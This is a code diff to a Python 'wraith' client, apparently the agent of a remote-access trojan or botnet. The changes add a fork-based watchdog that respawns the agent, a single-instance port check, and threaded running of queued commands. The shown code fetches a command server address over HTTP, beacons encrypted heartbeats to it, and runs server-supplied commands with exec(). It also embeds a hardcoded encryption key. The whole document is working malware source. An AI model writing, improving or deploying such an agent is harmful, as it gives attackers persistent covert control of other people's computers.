@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-
+# Required libs
 from aes import AesEncryption as aes  # From the same dir as this file
 import requests
 import threading
@@ -13,10 +13,13 @@ import time
 import platform
 import shutil
 import getpass
+from uuid import getnode as get_mac
+# Not Required Libs
+# Technically not required but very useful in modules / commands. It's faster
+# to import them here than every time in a command, plus importing them here
+# provides compatibility with pyinstaller and the like.
 import os
 import subprocess
-from uuid import getnode as get_mac
-
 
 overall_start_time = time.time()
 
@@ -36,32 +39,39 @@ CRYPT_KEY = "G39UHG83H2F92JC9H92VJ29W9HCG9WMHG2F1ZE10SKXQCSPKNXKZNBDCOG0Y"
 # URL is wrong
 TRUSTED_SERVER = "VWIVWNODCOWQPSPL"
 # Port used by the wraith on localhost to check if other wraiths are currently
-# running. We don't want duplicates
+# running. We don't want duplicates. The port can be any valid port number
+# which is unlikely to be taken by other processes.
 NON_DUPLICATE_CHECK_PORT = 47402
 # Whether to log the interactions with the server to the console.
 # Not recommended except for debugging
 INTERACTION_LOGGING = False
+# Whether to act as a watchdog and spawn children as the wraiths
+START_AS_WATCHDOG = True
 # DO NOT EDIT
 # This is for keeping track of the wraith version for the panel
 WRAITH_VERSION = "3.0.0"
 
 # END CONSTANTS
 
-# Fork and watch the child. Restart if it exits
-"""
-while True:
-    # This spawns a child process. The parent will monitor the child
-    # and re-start it if it exits
-    pid = os.fork()
-    # If this is not the child process (is parent), start monitoring
-    # child and re-start it in case of failure
-    if pid != 0:
-        try:
-            while True: psutil.Process(pid)
-        except psutil.NoSuchProcess: continue
-    # If this is the child process, exit the loop and continue
-    else: break
-"""
+if START_AS_WATCHDOG:
+    # Define a function to check if the single instance socket is taken
+    def is_wraith_running():
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            return not s.connect_ex(("localhost", NON_DUPLICATE_CHECK_PORT)) == 0
+
+    # Fork and watch the child. Restart if it exits
+    while True:
+        # Wait until the non-duplicate socket is free (this prevents the process
+        # from spawning new wraiths if a wraith is already active)
+        while is_wraith_running(): pass
+        # Spawn a child process. The parent will monitor the child
+        # and re-start it if it exits
+        pid = os.fork()
+        # If this is not the child process (is parent),  wait 1 second and loop
+        # back to the top of the loop and wait for child to exit.
+        if pid != 0: time.sleep(1)
+        # If this is the child process, exit the loop and continue
+        else: break
 
 this_child_start_time = time.time()
 
@@ -71,9 +81,7 @@ single_instance_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 try: single_instance_socket.bind(("localhost", NON_DUPLICATE_CHECK_PORT))
 except: sys.exit(0)
 
-
 aes = aes()
-
 
 class Wraith():
     def __init__(self, api_url, CRYPT_KEY, crypt_obj):
@@ -82,10 +90,6 @@ class Wraith():
         self.CRYPT_KEY = CRYPT_KEY # Create a local copy of the encryption key
         self.crypt = crypt_obj # Create a local copy of the encryption object
         self.command_queue = [] # Create a queue of all the commands to run
-
-        # Start the command running thread
-        self.command_thread = threading.Thread(target=self.run_commands_thread)
-        self.command_thread.start()
 
     # Make requests to the api and return responses
     def api(self, data_dict):
@@ -215,10 +219,10 @@ class Wraith():
         else: return False
 
     # Run all of the commands in the command_queue
-    def run_commands(self):
-        for cmd in self.command_queue:
+    def run_commands(self, local_command_queue):
+        for cmd in local_command_queue:
             try:
-                self.command_queue.remove(cmd)
+                local_command_queue.remove(cmd)
                 # Define a scope for the exec call so the script_main function
                 # can be used later
                 exec_scope = locals()
@@ -240,19 +244,10 @@ class Wraith():
                 # If there was an error, report it to the server
                 self.putresult(f"ERROR - {e}", f"Error while executing `{cmd[0]}`")
 
-    # Indefinitely run `run_commands`
-    def run_commands_thread(self):
-        while True: self.run_commands()
-
-
 # Get the address of the wraith API
 connect_url = requests.get(FETCH_SERVER_LOCATION_URL).text
 
-
 wraith = Wraith(connect_url, CRYPT_KEY, aes)
-
-# TODO retry timeout and restart
-# TODO robust server error handling
 
 # Start sending heartbeats
 # It's ok not to login beforehand as heartbeat will fail and the wraith will
@@ -269,6 +264,12 @@ while True:
             wraith.api_url = requests.get(FETCH_SERVER_LOCATION_URL).text
         # Continue to the next loop (re-send heartbeat)
         continue
+
+    # If there are new commands to be executed, start a thread to process
+    # them
+    if len(wraith.command_queue) > 0:
+        threading.Thread(target=wraith.run_commands, args=(wraith.command_queue.copy(),)).start()
+        wraith.command_queue = []
 
     # Delay sending hearbeats to prevent DDoSing our own server
     time.sleep(3.2)
